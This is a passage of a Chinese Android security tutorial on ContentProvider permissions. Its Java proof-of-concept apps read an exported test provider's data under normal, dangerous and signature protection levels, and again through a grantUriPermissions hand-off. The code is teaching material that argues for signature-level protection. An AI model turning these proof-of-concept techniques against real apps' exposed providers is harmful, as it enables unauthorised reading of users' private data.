    android:exported=&quot;true&quot;
    android:readPermission=&quot;wnagzihxa1n.permission.ReadMyContentProvider&quot;
    android:writePermission=&quot;wnagzihxa1n.permission.WriteMyContentProvider&quot;&gt;
&lt;/provider&gt;
</code></pre><p>修改<code>build.gradle</code>中的<code>targetSdkVersion</code>为19</p>
<p>然后我们先来测一下，代码不变，之前用过</p>
<pre><code>public class MainActivity extends Activity {

    static final String TAG = &quot;toT0C&quot;;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ContentResolver contentResolver = getContentResolver();

        // 插入数据
        Uri uri_insert = Uri.parse(&quot;content://com.wnagzihxa1n.contentprovider.MyContentProvider/person/insert&quot;);
        ContentValues values = new ContentValues();
        values.put(&quot;id&quot;, 1);
        values.put(&quot;name&quot;, &quot;wnagzihxa1n&quot;);
        values.put(&quot;phoneNumber&quot;, &quot;1 999-999-3389&quot;);
        contentResolver.insert(uri_insert, values);

        // 查询数据
        Cursor cursor = null;
        try {
            Uri uri_query = Uri.parse(&quot;content://com.wnagzihxa1n.contentprovider.MyContentProvider/person/query&quot;);
            cursor = contentResolver.query(uri_query, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    int id = cursor.getInt(0);
                    String contactName = cursor.getString(1);
                    String phoneNumber = cursor.getString(2);
                    Log.i(TAG, String.valueOf(id) + &#39; &#39; + contactName + &#39; &#39; + phoneNumber);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }
}
</code></pre><p>读出来</p>
<pre><code>01-25 06:03:06.805 2377-2377/com.wnagzihxa1n.contentprovider I/toT0C: 1 wnagzihxa1n 1 999-999-3389
</code></pre><p>运行PocAPK，此时先不添加权限，直接调用</p>
<pre><code>public class MainActivity extends Activity {

    private TextView textView;
    static final String TAG = &quot;toT0C&quot;;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        textView = (TextView) findViewById(R.id.text);
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = null;
        try {
            Uri uri_query = Uri.parse(&quot;content://com.wnagzihxa1n.contentprovider.MyContentProvider/person/query&quot;);
            cursor = contentResolver.query(uri_query, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    int id = cursor.getInt(0);
                    String contactName = cursor.getString(1);
                    String phoneNumber = cursor.getString(2);
                    textView.setText(String.valueOf(id) + &#39; &#39; + contactName + &#39; &#39; + phoneNumber);
                    Log.i(TAG, String.valueOf(id) + &#39; &#39; + contactName + &#39; &#39; + phoneNumber);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }
}
</code></pre><p>读取被拒绝</p>
<p><img src="Image/12.png" alt=""></p>
<p>我们添加权限</p>
<pre><code>&lt;uses-permission android:name=&quot;wnagzihxa1n.permission.ReadMyContentProvider&quot;/&gt;
</code></pre><p>再次读取，可以看到成功读取</p>
<p><img src="Image/13.png" alt=""></p>
<p>那么问题来了，既然我只要声明一下权限就可以读取，那这私有权限有啥用？？？？？？</p>
<p>当然这个问题是有的解决的，我们来看当时定义私有权限时的写法</p>
<pre><code>&lt;permission
    android:name=&quot;wnagzihxa1n.permission.ReadMyContentProvider&quot;
    android:label=&quot;Read MyContentProvider&quot;
    android:protectionLevel=&quot;normal&quot;/&gt;
</code></pre><p>有一个<code>protectionLevel</code>字段，值为<code>normal</code>，它有好几个值，有几个是常见的</p>
<ul>
<li>Normal：任何应用都可以申请，不提醒</li><li>Dangerous：任何应用都可以申请，会提醒，比如申请短信权限时那种提醒</li><li>Signature：同签名应用可申请</li><li>SignatureOrSystem：同签名应用或者系统应用可申请</li></ul>
<p>很多应用权限定义为<code>Dangerous</code>，这并没有用，多少用户直接就点击安装了，谁还会一个个权限看</p>
<p>比如我们设置成<code>Dangerous</code></p>
<pre><code>&lt;permission
    android:name=&quot;wnagzihxa1n.permission.ReadMyContentProvider&quot;
    android:label=&quot;Read MyContentProvider&quot;
    android:protectionLevel=&quot;dangerous&quot;/&gt;
</code></pre><p>然后安装，可以看到提醒了</p>
<p><img src="Image/14.png" alt=""></p>
<p>这里测试需要注意几个点：如果直接用的Android Studio安装，是直接装上的，不会有这个界面，如果是<code>adb install</code>也是没有这个界面的，怎么办呢？先编译出来，然后改一下后缀，因为如果是<code>.apk</code>后缀就直接安装了，但是如果是其它后缀就会放到<code>/sdcard/Download</code>下，所以我们进入这个目录改一下后缀，又发现个问题，没有文件管理器，所以再次下载一个RE文件管理器，进入对应的目录，点击安装即可出现安装界面</p>
<p>设置成<code>Signature</code>就好很多了，也就是说需要同签名的应用</p>
<pre><code>&lt;permission
    android:name=&quot;wnagzihxa1n.permission.ReadMyContentProvider&quot;
    android:label=&quot;Read MyContentProvider&quot;
    android:protectionLevel=&quot;signature&quot;/&gt;
</code></pre><p>这一把我们就需要把两个APP都编译出来，然后用两个不同的签名文件去签名</p>
<p>准备妥当后，运行起来，发现不能读到数据</p>
<p><img src="Image/15.png" alt=""></p>
<p>用同一个签名文件来签名，再次运行，可以读到</p>
<p><img src="Image/16.png" alt=""></p>
<p>至于最后一个<code>SignatureOrSystem</code>其实就不需要再测试了</p>
<p>然后有一个<code>grantUriPermissions</code>，我学习的时候理解了很久，大概就是说可以有一次临时的授权访问，比如这里有个应用设置了私有权限<code>readPermission</code>和<code>writePermission</code>，且设置了<code>grantUriPermissions</code>为<code>true</code>，此时有另一个应用，没有申请<code>readPermission</code>和<code>writePermission</code></p>
<p>我们看看可不可以读，把保护等级改为<code>normal</code></p>
<p>设置<code>grantUriPermissions</code>为<code>true</code></p>
<pre><code>&lt;provider
    android:authorities=&quot;com.wnagzihxa1n.contentprovider.MyContentProvider&quot;
    android:name=&quot;.MyContentProvider&quot;
    android:exported=&quot;true&quot;
    android:readPermission=&quot;wnagzihxa1n.permission.ReadMyContentProvider&quot;
    android:writePermission=&quot;wnagzihxa1n.permission.WriteMyContentProvider&quot;
    android:grantUriPermissions=&quot;true&quot;&gt;
</code></pre><p>再写一个应用PocAPK_grantUri，不申请<code>readPermission</code>和<code>writePermission</code>私有权限，其实就是把PocAPK的代码搬过来了，但是不申请权限</p>
<pre><code>public class MainActivity extends Activity {

    private TextView textView;
    static final String TAG = &quot;toT0C&quot;;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        textView = (TextView) findViewById(R.id.text);
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = null;
        try {
            Uri uri_query = Uri.parse(&quot;content://com.wnagzihxa1n.contentprovider.MyContentProvider/person/query&quot;);
            cursor = contentResolver.query(uri_query, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    int id = cursor.getInt(0);
                    String contactName = cursor.getString(1);
                    String phoneNumber = cursor.getString(2);
                    textView.setText(String.valueOf(id) + &#39; &#39; + contactName + &#39; &#39; + phoneNumber);
                    Log.i(TAG, String.valueOf(id) + &#39; &#39; + contactName + &#39; &#39; + phoneNumber);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }
}
</code></pre><p>我们尝试运行，读不出数据，因为我们没有设置权限</p>
<p><img src="Image/18.png" alt=""></p>
<p>然后修改PocAPK的代码为调用PocAPK_grantUri的Activity</p>
<pre><code>public class MainActivity extends Activity {

    private TextView textView;
    static final String TAG = &quot;toT0C&quot;;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent intent = new Intent(this, MainActivity.class);
        intent.setClassName(&quot;com.wnagzihxa1n.pocapk_granturi&quot;, &quot;com.wnagzihxa1n.pocapk_granturi.MainActivity&quot;);
        intent.setData(Uri.parse(&quot;content://com.wnagzihxa1n.contentprovider.MyContentProvider/person/query&quot;));
        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        startActivity(intent);
    }
}
</code></pre><p>跑起来，读出了数据</p>
<p><img src="Image/19.png" alt=""></p>
<p>最后，秀一下新换的壁纸，鬼哥在群里发的，分析汇编这绝对是有加成的</p>
<p><img src="cheatsheetv1-1920x1080.png" alt=""></p>
<p>下载链接</p>
<ul>
<li><a href="https://azeria-labs.com/downloads/cheatsheetv1-1920x1080.png">https://azeria-labs.com/downloads/cheatsheetv1-1920x1080.png</a></li></ul>
<h2 id="reference">Reference</h2>
<ul>
<li><a href="http://blog.csdn.net/hehe26/article/details/51784355">深入理解Android四大组件之一ContentProvider</a></li><li><a href="https://jaq.alibaba.com/blog.htm?id=61">Content Provider文件目录遍历漏洞浅析</a></li><li><a href="https://jaq.alibaba.com/community/art/show?articleid=352">Android安全开发之Provider组件安全</a></li><li><a href="https://www.cnblogs.com/goodhacker/p/5249122.html">Android应用安全之Content Provider安全</a></li><li><a href="http://wooyun.jozxing.cc/static/drops/tips-4314.html">Android Content Provider Security</a></li><li><a href="http://blog.csdn.net/u013107656/article/details/51862737">Android静态安全检测 -&gt; Content Provider组件暴露</a></li><li><a href="https://developer.android.com/guide/topics/manifest/provider-element.html">provider | Android Developers</a></li><li><a href="http://blog.csdn.net/azhengye/article/details/52914659">Android Permission介绍</a></li></ul>

</body>
</html>
<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
